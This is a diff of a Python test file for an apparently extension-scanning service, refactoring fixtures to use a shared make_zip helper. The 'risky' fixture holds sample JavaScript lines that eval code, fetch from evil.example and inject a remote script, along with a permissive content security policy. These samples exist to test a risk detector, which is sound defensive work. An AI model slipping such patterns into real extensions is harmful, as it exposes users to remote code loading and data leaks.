@@ -1,6 +1,4 @@
-import io
 import json
-import zipfile
 from unittest.mock import AsyncMock, patch
 
 import httpx
@@ -10,6 +8,7 @@ from sqlmodel.ext.asyncio.session import AsyncSession
 
 from app.fetchers.base import ExtensionMetadata, FetchError
 from app.models import Extension, FetchLog
+from tests.conftest import make_zip
 
 
 def _fake_metadata():
@@ -28,11 +27,9 @@ def _fake_metadata():
 
 
 def _fake_vsix() -> bytes:
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, "w") as zf:
-        zf.writestr(
-            "manifest.json",
-            json.dumps(
+    return make_zip(
+        {
+            "manifest.json": json.dumps(
                 {
                     "manifest_version": 3,
                     "name": "Test Extension",
@@ -40,17 +37,15 @@ def _fake_vsix() -> bytes:
                     "permissions": ["storage"],
                 }
             ),
-        )
-        zf.writestr("background.js", 'console.log("hello");')
-    return buf.getvalue()
+            "background.js": 'console.log("hello");',
+        }
+    )
 
 
 def _risky_vsix() -> bytes:
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, "w") as zf:
-        zf.writestr(
-            "manifest.json",
-            json.dumps(
+    return make_zip(
+        {
+            "manifest.json": json.dumps(
                 {
                     "manifest_version": 2,
                     "name": "Risky Extension",
@@ -60,14 +55,13 @@ def _risky_vsix() -> bytes:
                     "content_security_policy": "script-src 'self' 'unsafe-eval' http://bad.example *",
                 }
             ),
-        )
-        zf.writestr(
-            "background.js",
-            "eval('alert(1)');\n"
-            "fetch('https://evil.example/data');\n"
-            "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';\n",
-        )
-    return buf.getvalue()
+            "background.js": (
+                "eval('alert(1)');\n"
+                "fetch('https://evil.example/data');\n"
+                "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';\n"
+            ),
+        }
+    )
 
 
 async def test_list_extensions_empty(client):
